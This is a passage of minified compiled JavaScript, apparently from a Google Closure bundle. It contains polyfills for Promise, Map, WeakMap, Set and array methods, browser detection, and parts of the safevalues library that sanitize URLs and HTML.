          this.Kj(2, g);
        }),
        (e.prototype.ui = function (g) {
          this.Kj(1, g);
        }),
        (e.prototype.Kj = function (g, h) {
          if (0 != this.Ba)
            throw Error(
              "Cannot settle(" +
                g +
                ", " +
                h +
                "): Promise already settled in state" +
                this.Ba
            );
          (this.Ba = g), (this.Ua = h), 2 === this.Ba && this.jm(), this.Hk();
        }),
        (e.prototype.jm = function () {
          var g = this;
          d(function () {
            if (g.Al()) {
              var h = da.console;
              void 0 !== h && h.error(g.Ua);
            }
          }, 1);
        }),
        (e.prototype.Al = function () {
          if (this.Pi) return !1;
          var g = da.CustomEvent,
            h = da.Event,
            l = da.dispatchEvent;
          return (
            void 0 === l ||
            ("function" == typeof g
              ? (g = new g("unhandledrejection", { cancelable: !0 }))
              : "function" == typeof h
              ? (g = new h("unhandledrejection", { cancelable: !0 }))
              : (g = da.document.createEvent("CustomEvent")).initCustomEvent(
                  "unhandledrejection",
                  !1,
                  !0,
                  g
                ),
            (g.promise = this),
            (g.reason = this.Ua),
            l(g))
          );
        }),
        (e.prototype.Hk = function () {
          if (null != this.wd) {
            for (var g = 0; g < this.wd.length; ++g) f.Rh(this.wd[g]);
            this.wd = null;
          }
        });
      var f = new b();
      return (
        (e.prototype.nm = function (g) {
          var h = this.vg();
          g.Oe(h.resolve, h.reject);
        }),
        (e.prototype.om = function (g, h) {
          var l = this.vg();
          try {
            g.call(h, l.resolve, l.reject);
          } catch (m) {
            l.reject(m);
          }
        }),
        (e.prototype.then = function (g, h) {
          function l(B, S) {
            return "function" == typeof B
              ? function (Ba) {
                  try {
                    m(B(Ba));
                  } catch (Dc) {
                    q(Dc);
                  }
                }
              : S;
          }
          var m,
            q,
            y = new e(function (B, S) {
              (m = B), (q = S);
            });
          return this.Oe(l(g, m), l(h, q)), y;
        }),
        (e.prototype.catch = function (g) {
          return this.then(void 0, g);
        }),
        (e.prototype.Oe = function (g, h) {
          function l() {
            switch (m.Ba) {
              case 1:
                g(m.Ua);
                break;
              case 2:
                h(m.Ua);
                break;
              default:
                throw Error("Unexpected state: " + m.Ba);
            }
          }
          var m = this;
          null == this.wd ? f.Rh(l) : this.wd.push(l), (this.Pi = !0);
        }),
        (e.resolve = c),
        (e.reject = function (g) {
          return new e(function (h, l) {
            l(g);
          });
        }),
        (e.race = function (g) {
          return new e(function (h, l) {
            for (var m = ja(g), q = m.next(); !q.done; q = m.next())
              c(q.value).Oe(h, l);
          });
        }),
        (e.all = function (g) {
          var h = ja(g),
            l = h.next();
          return l.done
            ? c([])
            : new e(function (m, q) {
                function y(Ba) {
                  return function (Dc) {
                    (B[Ba] = Dc), 0 == --S && m(B);
                  };
                }
                var B = [],
                  S = 0;
                do {
                  B.push(void 0),
                    S++,
                    c(l.value).Oe(y(B.length - 1), q),
                    (l = h.next());
                } while (!l.done);
              });
        }),
        e
      );
    });
    var sa = function (a, b) {
      return Object.prototype.hasOwnProperty.call(a, b);
    };
    ea("WeakMap", function (a) {
      function b() {}
      function c(l) {
        var m = typeof l;
        return ("object" === m && null !== l) || "function" === m;
      }
      function d(l) {
        if (!sa(l, f)) {
          var m = new b();
          ba(l, f, { value: m });
        }
      }
      function e(l) {
        var m = Object[l];
        m &&
          (Object[l] = function (q) {
            return q instanceof b ? q : (Object.isExtensible(q) && d(q), m(q));
          });
      }
      if (
        (function () {
          if (!a || !Object.seal) return !1;
          try {
            var l = Object.seal({}),
              m = Object.seal({}),
              q = new a([
                [l, 2],
                [m, 3],
              ]);
            return (
              2 == q.get(l) &&
              3 == q.get(m) &&
              (q.delete(l), q.set(m, 4), !q.has(l) && 4 == q.get(m))
            );
          } catch (y) {
            return !1;
          }
        })()
      )
        return a;
      var f = "$jscomp_hidden_" + Math.random();
      e("freeze"), e("preventExtensions"), e("seal");
      var g = 0,
        h = function (l) {
          if (((this.Pa = (g += Math.random() + 1).toString()), l)) {
            l = ja(l);
            for (var m; !(m = l.next()).done; )
              (m = m.value), this.set(m[0], m[1]);
          }
        };
      return (
        (h.prototype.set = function (l, m) {
          if (!c(l)) throw Error("Invalid WeakMap key");
          if ((d(l), !sa(l, f))) throw Error("WeakMap key fail: " + l);
          return (l[f][this.Pa] = m), this;
        }),
        (h.prototype.get = function (l) {
          return c(l) && sa(l, f) ? l[f][this.Pa] : void 0;
        }),
        (h.prototype.has = function (l) {
          return c(l) && sa(l, f) && sa(l[f], this.Pa);
        }),
        (h.prototype.delete = function (l) {
          return (
            !!(c(l) && sa(l, f) && sa(l[f], this.Pa)) && delete l[f][this.Pa]
          );
        }),
        h
      );
    }),
      ea("Map", function (a) {
        if (
          (function () {
            if (
              !a ||
              "function" != typeof a ||
              !a.prototype.entries ||
              "function" != typeof Object.seal
            )
              return !1;
            try {
              var h = Object.seal({ x: 4 }),
                l = new a(ja([[h, "s"]]));
              if (
                "s" != l.get(h) ||
                1 != l.size ||
                l.get({ x: 4 }) ||
                l.set({ x: 4 }, "t") != l ||
                2 != l.size
              )
                return !1;
              var m = l.entries(),
                q = m.next();
              return (
                !q.done &&
                q.value[0] == h &&
                "s" == q.value[1] &&
                !(
                  (q = m.next()).done ||
                  4 != q.value[0].x ||
                  "t" != q.value[1] ||
                  !m.next().done
                )
              );
            } catch (y) {
              return !1;
            }
          })()
        )
          return a;
        var b = new WeakMap(),
          c = function (h) {
            if (((this[0] = {}), (this[1] = f()), (this.size = 0), h)) {
              h = ja(h);
              for (var l; !(l = h.next()).done; )
                (l = l.value), this.set(l[0], l[1]);
            }
          };
        (c.prototype.set = function (h, l) {
          var m = d(this, (h = 0 === h ? 0 : h));
          return (
            m.list || (m.list = this[0][m.id] = []),
            m.Oa
              ? (m.Oa.value = l)
              : ((m.Oa = {
                  next: this[1],
                  Yb: this[1].Yb,
                  head: this[1],
                  key: h,
                  value: l,
                }),
                m.list.push(m.Oa),
                (this[1].Yb.next = m.Oa),
                (this[1].Yb = m.Oa),
                this.size++),
            this
          );
        }),
          (c.prototype.delete = function (h) {
            return (
              !(!(h = d(this, h)).Oa || !h.list) &&
              (h.list.splice(h.index, 1),
              h.list.length || delete this[0][h.id],
              (h.Oa.Yb.next = h.Oa.next),
              (h.Oa.next.Yb = h.Oa.Yb),
              (h.Oa.head = null),
              this.size--,
              !0)
            );
          }),
          (c.prototype.clear = function () {
            (this[0] = {}), (this[1] = this[1].Yb = f()), (this.size = 0);
          }),
          (c.prototype.has = function (h) {
            return !!d(this, h).Oa;
          }),
          (c.prototype.get = function (h) {
            return (h = d(this, h).Oa) && h.value;
          }),
          (c.prototype.entries = function () {
            return e(this, function (h) {
              return [h.key, h.value];
            });
          }),
          (c.prototype.keys = function () {
            return e(this, function (h) {
              return h.key;
            });
          }),
          (c.prototype.values = function () {
            return e(this, function (h) {
              return h.value;
            });
          }),
          (c.prototype.forEach = function (h, l) {
            for (var q, m = this.entries(); !(q = m.next()).done; )
              (q = q.value), h.call(l, q[1], q[0], this);
          }),
          (c.prototype[Symbol.iterator] = c.prototype.entries);
        var d = function (h, l) {
            var m = l && typeof l;
            "object" == m || "function" == m
              ? b.has(l)
                ? (m = b.get(l))
                : ((m = "" + ++g), b.set(l, m))
              : (m = "p_" + l);
            var q = h[0][m];
            if (q && sa(h[0], m))
              for (h = 0; h < q.length; h++) {
                var y = q[h];
                if ((l != l && y.key != y.key) || l === y.key)
                  return { id: m, list: q, index: h, Oa: y };
              }
            return { id: m, list: q, index: -1, Oa: void 0 };
          },
          e = function (h, l) {
            var m = h[1];
            return fa(function () {
              if (m) {
                for (; m.head != h[1]; ) m = m.Yb;
                for (; m.next != m.head; )
                  return (m = m.next), { done: !1, value: l(m) };
                m = null;
              }
              return { done: !0, value: void 0 };
            });
          },
          f = function () {
            var h = {};
            return (h.Yb = h.next = h.head = h);
          },
          g = 0;
        return c;
      }),
      ea("Array.prototype.find", function (a) {
        return (
          a ||
          function (b, c) {
            a: {
              var d = this;
              d instanceof String && (d = String(d));
              for (var e = d.length, f = 0; f < e; f++) {
                var g = d[f];
                if (b.call(c, g, f, d)) {
                  b = g;
                  break a;
                }
              }
              b = void 0;
            }
            return b;
          }
        );
      });
    var ta = function (a, b) {
      a instanceof String && (a += "");
      var c = 0,
        d = !1,
        e = {
          next: function () {
            if (!d && c < a.length) {
              var f = c++;
              return { value: b(f, a[f]), done: !1 };
            }
            return (d = !0), { done: !0, value: void 0 };
          },
        };
      return (
        (e[Symbol.iterator] = function () {
          return e;
        }),
        e
      );
    };
    ea("Array.prototype.keys", function (a) {
      return (
        a ||
        function () {
          return ta(this, function (b) {
            return b;
          });
        }
      );
    }),
      ea("Set", function (a) {
        if (
          (function () {
            if (
              !a ||
              "function" != typeof a ||
              !a.prototype.entries ||
              "function" != typeof Object.seal
            )
              return !1;
            try {
              var c = Object.seal({ x: 4 }),
                d = new a(ja([c]));
              if (
                !d.has(c) ||
                1 != d.size ||
                d.add(c) != d ||
                1 != d.size ||
                d.add({ x: 4 }) != d ||
                2 != d.size
              )
                return !1;
              var e = d.entries(),
                f = e.next();
              return (
                !f.done &&
                f.value[0] == c &&
                f.value[1] == c &&
                !(f = e.next()).done &&
                f.value[0] != c &&
                4 == f.value[0].x &&
                f.value[1] == f.value[0] &&
                e.next().done
              );
            } catch (g) {
              return !1;
            }
          })()
        )
          return a;
        var b = function (c) {
          if (((this.ab = new Map()), c)) {
            c = ja(c);
            for (var d; !(d = c.next()).done; ) this.add(d.value);
          }
          this.size = this.ab.size;
        };
        return (
          (b.prototype.add = function (c) {
            return (
              (c = 0 === c ? 0 : c),
              this.ab.set(c, c),
              (this.size = this.ab.size),
              this
            );
          }),
          (b.prototype.delete = function (c) {
            return (c = this.ab.delete(c)), (this.size = this.ab.size), c;
          }),
          (b.prototype.clear = function () {
            this.ab.clear(), (this.size = 0);
          }),
          (b.prototype.has = function (c) {
            return this.ab.has(c);
          }),
          (b.prototype.entries = function () {
            return this.ab.entries();
          }),
          (b.prototype.values = function () {
            return this.ab.values();
          }),
          (b.prototype.keys = b.prototype.values),
          (b.prototype[Symbol.iterator] = b.prototype.values),
          (b.prototype.forEach = function (c, d) {
            var e = this;
            this.ab.forEach(function (f) {
              return c.call(d, f, f, e);
            });
          }),
          b
        );
      }),
      ea("Array.prototype.entries", function (a) {
        return (
          a ||
          function () {
            return ta(this, function (b, c) {
              return [b, c];
            });
          }
        );
      }),
      ea("String.prototype.startsWith", function (a) {
        return (
          a ||
          function (b, c) {
            if (null == this)
              throw new TypeError(
                "The 'this' value for String.prototype.startsWith must not be null or undefined"
              );
            if (b instanceof RegExp)
              throw new TypeError(
                "First argument to String.prototype.startsWith must not be a regular expression"
              );
            var d = this + "",
              e = d.length,
              f = (b += "").length;
            c = Math.max(0, Math.min(0 | c, d.length));
            for (var g = 0; g < f && c < e; ) if (d[c++] != b[g++]) return !1;
            return g >= f;
          }
        );
      }),
      ea("Number.isFinite", function (a) {
        return (
          a ||
          function (b) {
            return (
              "number" == typeof b && !isNaN(b) && 1 / 0 !== b && -1 / 0 !== b
            );
          }
        );
      }),
      ea("Array.from", function (a) {
        return (
          a ||
          function (b, c, d) {
            c =
              null != c
                ? c
                : function (h) {
                    return h;
                  };
            var e = [],
              f =
                "undefined" != typeof Symbol &&
                Symbol.iterator &&
                b[Symbol.iterator];
            if ("function" == typeof f) {
              b = f.call(b);
              for (var g = 0; !(f = b.next()).done; )
                e.push(c.call(d, f.value, g++));
            } else
              for (f = b.length, g = 0; g < f; g++) e.push(c.call(d, b[g], g));
            return e;
          }
        );
      }),
      ea("Object.entries", function (a) {
        return (
          a ||
          function (b) {
            var d,
              c = [];
            for (d in b) sa(b, d) && c.push([d, b[d]]);
            return c;
          }
        );
      }),
      ea("Object.values", function (a) {
        return (
          a ||
          function (b) {
            var d,
              c = [];
            for (d in b) sa(b, d) && c.push(b[d]);
            return c;
          }
        );
      }),
      ea("Array.prototype.values", function (a) {
        return (
          a ||
          function () {
            return ta(this, function (b, c) {
              return c;
            });
          }
        );
      });
    var ua = ua || {},
      p = this || self,
      r = function (a, b) {
        a = a.split(".");
        var d,
          c = p;
        a[0] in c || void 0 === c.execScript || c.execScript("var " + a[0]);
        for (; a.length && (d = a.shift()); )
          a.length || void 0 === b
            ? (c = c[d] && c[d] !== Object.prototype[d] ? c[d] : (c[d] = {}))
            : (c[d] = b);
      },
      va = function (a) {
        var b = typeof a;
        return "object" != b
          ? b
          : a
          ? Array.isArray(a)
            ? "array"
            : b
          : "null";
      },
      wa = function (a) {
        var b = va(a);
        return "array" == b || ("object" == b && "number" == typeof a.length);
      },
      t = function (a) {
        var b = typeof a;
        return ("object" == b && null != a) || "function" == b;
      },
      xa = function (a, b, c) {
        return a.call.apply(a.bind, arguments);
      },
      ya = function (a, b, c) {
        if (!a) throw Error();
        if (2 < arguments.length) {
          var d = Array.prototype.slice.call(arguments, 2);
          return function () {
            var e = Array.prototype.slice.call(arguments);
            return Array.prototype.unshift.apply(e, d), a.apply(b, e);
          };
        }
        return function () {
          return a.apply(b, arguments);
        };
      },
      u = function (a, b, c) {
        return (u =
          Function.prototype.bind &&
          -1 != Function.prototype.bind.toString().indexOf("native code")
            ? xa
            : ya).apply(null, arguments);
      },
      za = function (a, b) {
        var c = Array.prototype.slice.call(arguments, 1);
        return function () {
          var d = c.slice();
          return d.push.apply(d, arguments), a.apply(this, d);
        };
      },
      v = function (a, b) {
        function c() {}
        (c.prototype = b.prototype),
          (a.Id = b.prototype),
          (a.prototype = new c()),
          (a.prototype.constructor = a),
          (a.Qd = function (d, e, f) {
            for (
              var g = Array(arguments.length - 2), h = 2;
              h < arguments.length;
              h++
            )
              g[h - 2] = arguments[h];
            return b.prototype[e].apply(d, g);
          });
      },
      Aa = function (a) {
        return a;
      },
      Ca = function (a) {
        var b = (window.___jsl = window.___jsl || {});
        if (((b.cfg = b.cfg || {}), (b = b.cfg), !a)) return b;
        for (
          var c = 0, d = (a = a.split("/")).length;
          b && "object" == typeof b && c < d;
          ++c
        )
          b = b[a[c]];
        return c === a.length && void 0 !== b ? b : void 0;
      },
      Ea;
    function Da(a, b) {
      if (Error.captureStackTrace) Error.captureStackTrace(this, Da);
      else {
        var c = Error().stack;
        c && (this.stack = c);
      }
      a && (this.message = String(a)), void 0 !== b && (this.cause = b);
    }
    function Fa(a, b) {
      for (var c = "", d = (a = a.split("%s")).length - 1, e = 0; e < d; e++)
        c += a[e] + (e < b.length ? b[e] : "%s");
      Da.call(this, c + a[d]);
    }
    function Ga(a, b, c, d) {
      var e = "Assertion failed";
      if (c) {
        e += ": " + c;
        var f = d;
      } else a && ((e += ": " + a), (f = b));
      throw new Fa("" + e, f || []);
    }
    v(Da, Error),
      (Da.prototype.name = "CustomError"),
      v(Fa, Da),
      (Fa.prototype.name = "AssertionError");
    var w = function (a, b, c) {
        return (
          a || Ga("", null, b, Array.prototype.slice.call(arguments, 2)), a
        );
      },
      Ha = function (a, b, c) {
        return (
          null == a &&
            Ga(
              "Expected to exist: %s.",
              [a],
              b,
              Array.prototype.slice.call(arguments, 2)
            ),
          a
        );
      },
      Ia = function (a, b) {
        throw new Fa(
          "Failure" + (a ? ": " + a : ""),
          Array.prototype.slice.call(arguments, 1)
        );
      },
      Ja = function (a, b, c) {
        return (
          "number" != typeof a &&
            Ga(
              "Expected number but got %s: %s.",
              [va(a), a],
              b,
              Array.prototype.slice.call(arguments, 2)
            ),
          a
        );
      },
      Ka = function (a, b, c) {
        "function" != typeof a &&
          Ga(
            "Expected function but got %s: %s.",
            [va(a), a],
            b,
            Array.prototype.slice.call(arguments, 2)
          );
      },
      La = Array.prototype.indexOf
        ? function (a, b) {
            return (
              w(null != a.length), Array.prototype.indexOf.call(a, b, void 0)
            );
          }
        : function (a, b) {
            if ("string" == typeof a)
              return "string" != typeof b || 1 != b.length
                ? -1
                : a.indexOf(b, 0);
            for (var c = 0; c < a.length; c++)
              if (c in a && a[c] === b) return c;
            return -1;
          },
      x = Array.prototype.forEach
        ? function (a, b) {
            w(null != a.length), Array.prototype.forEach.call(a, b, void 0);
          }
        : function (a, b) {
            for (
              var c = a.length,
                d = "string" == typeof a ? a.split("") : a,
                e = 0;
              e < c;
              e++
            )
              e in d && b.call(void 0, d[e], e, a);
          };
    function Ma(a, b) {
      for (
        var c = "string" == typeof a ? a.split("") : a, d = a.length - 1;
        0 <= d;
        --d
      )
        d in c && b.call(void 0, c[d], d, a);
    }
    var Na = Array.prototype.filter
        ? function (a, b) {
            return (
              w(null != a.length), Array.prototype.filter.call(a, b, void 0)
            );
          }
        : function (a, b) {
            for (
              var c = a.length,
                d = [],
                e = 0,
                f = "string" == typeof a ? a.split("") : a,
                g = 0;
              g < c;
              g++
            )
              if (g in f) {
                var h = f[g];
                b.call(void 0, h, g, a) && (d[e++] = h);
              }
            return d;
          },
      Oa = Array.prototype.map
        ? function (a, b) {
            return w(null != a.length), Array.prototype.map.call(a, b, void 0);
          }
        : function (a, b) {
            for (
              var c = a.length,
                d = Array(c),
                e = "string" == typeof a ? a.split("") : a,
                f = 0;
              f < c;
              f++
            )
              f in e && (d[f] = b.call(void 0, e[f], f, a));
            return d;
          },
      Pa = Array.prototype.some
        ? function (a, b) {
            return w(null != a.length), Array.prototype.some.call(a, b, void 0);
          }
        : function (a, b) {
            for (
              var c = a.length,
                d = "string" == typeof a ? a.split("") : a,
                e = 0;
              e < c;
              e++
            )
              if (e in d && b.call(void 0, d[e], e, a)) return !0;
            return !1;
          };
    function Qa(a, b) {
      return 0 <= La(a, b);
    }
    function Ra(a, b) {
      var c;
      return (c = 0 <= (b = La(a, b))) && Sa(a, b), c;
    }
    function Sa(a, b) {
      return (
        w(null != a.length), 1 == Array.prototype.splice.call(a, b, 1).length
      );
    }
    function Ta(a, b) {
      Ma(a, function (d, e) {
        b.call(void 0, d, e, a) && Sa(a, e) && 0;
      });
    }
    function Ua(a) {
      var b = a.length;
      if (0 < b) {
        for (var c = Array(b), d = 0; d < b; d++) c[d] = a[d];
        return c;
      }
      return [];
    }
    function Va(a, b) {
      for (var e, c = 0, d = a.length; c < d; ) {
        var f = c + ((d - c) >>> 1),
          g = b.call(void 0, a[f], f, a);
        0 < g ? (c = f + 1) : ((d = f), (e = !g));
      }
      return e ? c : -c - 1;
    }
    function Wa(a, b) {
      for (var c in a) b.call(void 0, a[c], c, a);
    }
    function Xa(a, b) {
      for (var c in a) if (b.call(void 0, a[c], c, a)) return !0;
      return !1;
    }
    function Ya(a) {
      for (var b in a) return !1;
      return !0;
    }
    function Za(a) {
      var c,
        b = {};
      for (c in a) b[c] = a[c];
      return b;
    }
    var $a =
        "constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(
          " "
        ),
      bb,
      cb;
    function ab(a, b) {
      for (var c, d, e = 1; e < arguments.length; e++) {
        for (c in (d = arguments[e])) a[c] = d[c];
        for (var f = 0; f < $a.length; f++)
          (c = $a[f]),
            Object.prototype.hasOwnProperty.call(d, c) && (a[c] = d[c]);
      }
    }
    a: {
      for (var db = ["CLOSURE_FLAGS"], eb = p, fb = 0; fb < db.length; fb++)
        if (((eb = eb[db[fb]]), null == eb)) {
          cb = null;
          break a;
        }
      cb = eb;
    }
    var gb = cb && cb[610401301];
    bb = null != gb && gb;
    var hb,
      ib = function () {
        if (void 0 === hb) {
          var a = null,
            b = p.trustedTypes;
          if (b && b.createPolicy)
            try {
              a = b.createPolicy("goog#html", {
                createHTML: Aa,
                createScript: Aa,
                createScriptURL: Aa,
              });
            } catch (c) {
              p.console && p.console.error(c.message);
            }
          hb = a;
        }
        return hb;
      },
      lb = function (a, b) {
        (this.Qj = (a === jb && b) || ""), (this.fk = kb);
      };
    lb.prototype.toString = function () {
      return this.Qj;
    };
    var kb = {},
      jb = {},
      nb = function (a, b) {
        if (b !== mb)
          throw Error("TrustedResourceUrl is not meant to be built directly");
        this.uj = a;
      };
    nb.prototype.toString = function () {
      return this.uj + "";
    };
    var ob = function (a) {
        return a instanceof nb && a.constructor === nb
          ? a.uj
          : (Ia(
              "expected object of type TrustedResourceUrl, got '%s' of type %s",
              a,
              va(a)
            ),
            "type_error:TrustedResourceUrl");
      },
      mb = {},
      pb = function (a) {
        var b = ib();
        return (a = b ? b.createScriptURL(a) : a), new nb(a, mb);
      },
      rb = function (a, b) {
        if (b !== qb) throw Error("SafeUrl is not meant to be built directly");
        this.tj = a;
      };
    rb.prototype.toString = function () {
      return this.tj.toString();
    };
    var sb = function (a) {
        return a instanceof rb && a.constructor === rb
          ? a.tj
          : (Ia(
              "expected object of type SafeUrl, got '" +
                a +
                "' of type " +
                va(a)
            ),
            "type_error:SafeUrl");
      },
      tb;
    try {
      new URL("s://g"), (tb = !0);
    } catch (a) {
      tb = !1;
    }
    var ub = tb,
      vb = function (a) {
        if (a instanceof rb) return a;
        a: {
          var b = (a = String(a));
          if (ub) {
            try {
              var c = new URL(b);
            } catch (d) {
              b = "https:";
              break a;
            }
            b = c.protocol;
          } else
            b: {
              c = document.createElement("a");
              try {
                c.href = b;
              } catch (d) {
                b = void 0;
                break b;
              }
              b = ":" === (b = c.protocol) || "" === b ? "https:" : b;
            }
        }
        return (
          w("javascript:" !== b, "%s is a javascript: URL", a) ||
            (a = "about:invalid#zClosurez"),
          new rb(a, qb)
        );
      },
      qb = {},
      wb = new rb("about:invalid#zClosurez", qb);
    new rb("about:blank", qb);
    var xb = /&/g,
      yb = /</g,
      zb = />/g,
      Ab = /"/g,
      Bb = /'/g,
      Cb = /\x00/g,
      Db = /[\x00&<>"']/,
      z = function (a, b) {
        return -1 != a.indexOf(b);
      },
      Eb = {},
      Fb = function () {
        if (Eb != Eb)
          throw Error("SafeStyle is not meant to be built directly");
        this.Pl = "";
      };
    (Fb.prototype.toString = function () {
      return this.Pl.toString();
    }),
      new Fb();
    var Gb = {},
      Hb = function () {
        if (Gb != Gb)
          throw Error("SafeStyleSheet is not meant to be built directly");
        this.Ol = "";
      };
    function Ib() {
      var a = p.navigator;
      return a && (a = a.userAgent) ? a : "";
    }
    (Hb.prototype.toString = function () {
      return this.Ol.toString();
    }),
      new Hb();
    var Jb,
      Kb = p.navigator;
    function Lb(a) {
      return (
        !!bb &&
        !!Jb &&
        Jb.brands.some(function (b) {
          return (b = b.brand) && z(b, a);
        })
      );
    }
    function A(a) {
      return z(Ib(), a);
    }
    function Mb() {
      return !!bb && !!Jb && 0 < Jb.brands.length;
    }
    function Nb() {
      return !Mb() && (A("Trident") || A("MSIE"));
    }
    function Ob() {
      return Mb()
        ? Lb("Chromium")
        : ((A("Chrome") || A("CriOS")) && !(!Mb() && A("Edge"))) || A("Silk");
    }
    Jb = (Kb && Kb.userAgentData) || null;
    var Pb = {},
      Qb = function (a, b) {
        if (b !== Pb) throw Error("SafeHtml is not meant to be built directly");
        this.sj = a;
      };
    Qb.prototype.toString = function () {
      return this.sj.toString();
    };
    var Rb = function (a) {
        return a instanceof Qb && a.constructor === Qb
          ? a.sj
          : (Ia(
              "expected object of type SafeHtml, got '" +
                a +
                "' of type " +
                va(a)
            ),
            "type_error:SafeHtml");
      },
      Sb = function (a) {
        var b = ib();
        return (a = b ? b.createHTML(a) : a), new Qb(a, Pb);
      };
    new Qb((p.trustedTypes && p.trustedTypes.emptyHTML) || "", Pb);
    var Tb = ha([""]),
      Ub = ia(["\0"], ["\\0"]),
      Vb = ia(["\n"], ["\\n"]),
      Wb = ia(["\0"], ["\\u0000"]),
      Xb = ha([""]),
      Yb = ia(["\0"], ["\\0"]),
      Zb = ia(["\n"], ["\\n"]),
      $b = ia(["\0"], ["\\u0000"]);
    function ac(a) {
      return Object.isFrozen(a) && Object.isFrozen(a.raw);
    }
    function bc(a) {
      return -1 === a.toString().indexOf("`");
    }
    var cc =
        bc(function (a) {
          return a(Tb);
        }) ||
        bc(function (a) {
          return a(Ub);
        }) ||
        bc(function (a) {
          return a(Vb);
        }) ||
        bc(function (a) {
          return a(Wb);
        }),
      dc = ac(Xb) && ac(Yb) && ac(Zb) && ac($b),
      ec = function (a) {
        this.ul = a;
      };
    function fc(a) {
      return new ec(function (b) {
        return b.substr(0, a.length + 1).toLowerCase() === a + ":";
      });
    }
    var gc = [
      fc("data"),
      fc("http"),
      fc("https"),
      fc("mailto"),
      fc("ftp"),
      new ec(function (a) {
        return /^[^:]*([/?#]|$)/.test(a);
      }),
    ];
    function hc(a) {
      var b = void 0 === b ? gc : b;
      a: if (((b = void 0 === b ? gc : b), a instanceof rb)) b = a;
      else {
        for (var c = 0; c < b.length; ++c) {
          var d = b[c];
          if (d instanceof ec && d.ul(a)) {
            b = new rb(a, qb);
            break a;
          }
        }
        b = void 0;
      }
      return void 0 === b && ic(a.toString()), b || wb;
    }
    var jc = /^\s*(?!javascript:)(?:[a-z0-9+.-]+:|[^:\/?#]*(?:[\/?#]|$))/i;
    function kc(a) {
      return (
        a instanceof rb ? (a = sb(a)) : jc.test(a) || (ic(a), (a = void 0)), a
      );
    }
    var lc = [],
      ic = function () {};
    function mc(a) {
      -1 === lc.indexOf(a) && lc.push(a),
        (ic = function (b) {
          lc.forEach(function (c) {
            c(b);
          });
        });
    }
    function nc(a) {
      var b = ra.apply(1, arguments),
        c = b.length;
      if (
        !Array.isArray(a) ||
        !Array.isArray(a.raw) ||
        a.length !== a.raw.length ||
        (!cc && a === a.raw) ||
        !((cc && !dc) || ac(a)) ||
        c + 1 !== a.length
      )
        throw new TypeError(
          "\n    ############################## ERROR ##############################\n\n    It looks like you are trying to call a template tag function (fn`...`)\n    using the normal function syntax (fn(...)), which is not supported.\n\n    The functions in the safevalues library are not designed to be called\n    like normal functions, and doing so invalidates the security guarantees\n    that safevalues provides.\n\n    If you are stuck and not sure how to proceed, please reach out to us\n    instead through:\n     - go/ise-hardening-yaqs (preferred) // LINE-INTERNAL\n     - g/ise-hardening // LINE-INTERNAL\n     - https://github.com/google/safevalues/issues\n\n    ############################## ERROR ##############################"
        );
      if (0 === b.length) return pb(a[0]);
      if (((c = a[0].toLowerCase()), /^data:/.test(c)))
        throw Error(
          "Data URLs cannot have expressions in the template literal input."
        );
      if (/^https:\/\//.test(c) || /^\/\//.test(c)) {
        var d = c.indexOf("//") + 2,
          e = c.indexOf("/", d);
        if (e <= d)
          throw Error(
            "Can't interpolate data in a url's origin, Please make sure to fully specify the origin, terminated with '/'."
          );
        if (((d = c.substring(d, e)), !/^[0-9a-z.:-]+$/i.test(d)))
          throw Error("The origin contains unsupported characters.");
        if (!/^[^:]*(:[0-9]+)?$/i.test(d)) throw Error("Invalid port number.");
        if (!/(^|\.)[a-z][^.]*$/i.test(d))
          throw Error("The top-level domain must start with a letter.");
        d = !0;
      } else d = !1;
      if (!d)
        if (/^\//.test(c)) {
          if (!("/" === c || (1 < c.length && "/" !== c[1] && "\\" !== c[1])))
            throw Error("The path start in the url is invalid.");
          d = !0;
        } else d = !1;
      if (!(d = d || RegExp("^[^:\\s\\\\/]+/").test(c)))
        if (/^about:blank/.test(c)) {
          if ("about:blank" !== c && !/^about:blank#/.test(c))
            throw Error("The about url is invalid.");
          d = !0;
        } else d = !1;
      if (!d)
        throw Error(
          "Trying to interpolate expressions in an unsupported url format."
        );
      for (c = a[0], d = 0; d < b.length; d++)
        c += encodeURIComponent(b[d]) + a[d + 1];
      return pb(c);
    }
    mc(function (a) {
      console.warn("A URL with content '" + a + "' was sanitized away.");
    });
    var oc = function (a, b) {
      if (
        !t(a) ||
        !t(a) ||
        !t(a) ||
        1 !== a.nodeType ||
        (a.namespaceURI && "http://www.w3.org/1999/xhtml" !== a.namespaceURI) ||
        a.tagName.toUpperCase() !== b.toString()
      ) {
        if (((b = b.toString() + "; got: "), t(a)))
          try {
            var c =
              a.constructor.displayName ||
              a.constructor.name ||
              Object.prototype.toString.call(a);
          } catch (d) {
            c = "<object could not be stringified>";
          }
        else c = void 0 === a ? "undefined" : null === a ? "null" : typeof a;
        Ia("Argument is not an HTML Element with tag name " + (b + c));
      }
    };
    function pc() {
      return A("iPhone") && !A("iPod") && !A("iPad");
    }
    var qc = function (a) {
      return qc[" "](a), a;
    };
    qc[" "] = function () {};
    var rc = !Mb() && A("Opera"),
      sc = Nb(),
      tc = A("Edge"),
      uc = tc || sc,
      vc =
        A("Gecko") &&
        !(z(Ib().toLowerCase(), "webkit") && !A("Edge")) &&
        !(A("Trident") || A("MSIE")) &&
        !A("Edge"),
      wc = z(Ib().toLowerCase(), "webkit") && !A("Edge"),
      xc = wc && A("Mobile"),
      yc = function () {
        var a = p.document;
        return a ? a.documentMode : void 0;
      },
      zc,
      a;
    a: {
      var Ac = "",
        Bc =
          ((a = Ib()),
          vc
            ? /rv:([^\);]+)(\)|;)/.exec(a)
            : tc
            ? /Edge\/([\d\.]+)/.exec(a)
            : sc
            ? /\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a)
            : wc
            ? /WebKit\/(\S+)/.exec(a)
            : rc
            ? /(?:Version)[ \/]?(\S+)/.exec(a)
            : void 0);
      if ((Bc && (Ac = Bc ? Bc[1] : ""), sc)) {
        var Cc = yc();
        if (null != Cc && Cc > parseFloat(Ac)) {
          zc = String(Cc);
          break a;
        }
      }
      zc = Ac;
    }
    var Ec = zc,
      Fc;
    if (p.document && sc) {
      var Gc = yc();
      Fc = Gc || parseInt(Ec, 10) || void 0;
    } else Fc = void 0;
    var Hc = Fc;
    try {
      new self.OffscreenCanvas(0, 0).getContext("2d");
    } catch (a) {}
    var Ic = function () {},
      Jc = function (a) {
        return "function" == typeof a;
      };
    function Kc(a) {
      if ("string" != typeof a || "" === a.trim())
        throw Error(
          "Calls to uncheckedconversion functions must go through security review. A justification must be provided to capture what security assumptions are being made. See go/unchecked-conversions"
        );
    }
    var Mc = function (a, b) {
        oc(a, "SCRIPT");
